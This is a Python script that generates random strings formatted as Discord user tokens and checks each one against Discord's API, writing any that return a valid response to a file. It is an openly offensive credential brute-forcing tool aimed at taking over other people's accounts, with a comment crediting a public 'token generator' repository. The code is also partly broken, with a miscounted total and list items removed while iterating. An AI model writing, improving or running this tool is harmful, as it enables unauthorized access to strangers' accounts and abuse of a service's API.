import os
import random
from random import randint
import base64
import string
import requests

def configInfo():
    if os.path.isfile(f"{os.getcwd()}\\config.txt") == False:
        f = open(f"{os.getcwd()}\\config.txt", 'w')
        f.write("amount=1234\n")
        f.write("proxies=abcd")
        f.close()
        print("Config file not found. Generating...\nPlease edit the file.")
        return ()
    else:
        f = open(f"{os.getcwd()}\\config.txt", 'r')
        lines = f.readlines()
        try:
            amount = int(lines[0].split('=')[1])
            try:
                proxies = lines[1].split('=')[1]
                print("Got config information!")
                return (amount, proxies)
            except:
                print("Something went wrong, regenerating config file...\nPlease edit the new file.")
                f = open(f"{os.getcwd()}\\config.txt", 'w')
                f.write("amount=1234\n")
                f.write("proxies=abcd")
                f.close()
                return ()
        except:
            print("Something went wrong, regenerating config file...\nPlease edit the new file.")
            f = open(f"{os.getcwd()}\\config.txt", 'w')
            f.write("amount=1234\n")
            f.write("proxies=abcd")
            f.close()
            return ()

def generateTokens(count): # Cheers to 'silvanohirtie' (GitHub) for sharing this awesome code! I know nothing about encoding! File reference: 'https://github.com/silvanohirtie/Discord-Token-Generator/blob/master/generator.py'
    tokens = []
    for i in range(count):
        base64_string = "=="
        while(base64_string.find("==") != -1):
            sample_string = str(randint(000000000000000000, 999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                        for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
    print(f"Generated {str(count)} tokens!")
    return tokens

def validateTokens(tokens):
    print("Starting to validate tokens!\n")
    f = open(f"{os.getcwd()}\\tokens.txt", 'w')
    for i in range(len(tokens)):
        r = requests.get("https://discordapp.com/api/v8/users/@me/library", headers={"Content-Type": "application/json", "authorization": tokens[i]}) # , proxies={"http": proxy}
        if r.status_code == 200:
            print("[+] Valid token! Adding to file...")
            f.write(f"{tokens[i]}\n")
        elif r.status_code == 401:
            print(f"[-] Invalid token. Next token... Response: {r.text}")
        else:
            print(f"[?] Unknown, maybe rate limit? Response & Status code: {r.status_code}, {r.text}")
            tokens.remove(tokens[i])

info = configInfo()

if info != ():
    tokens = generateTokens(info[0])
    validateTokens(tokens)
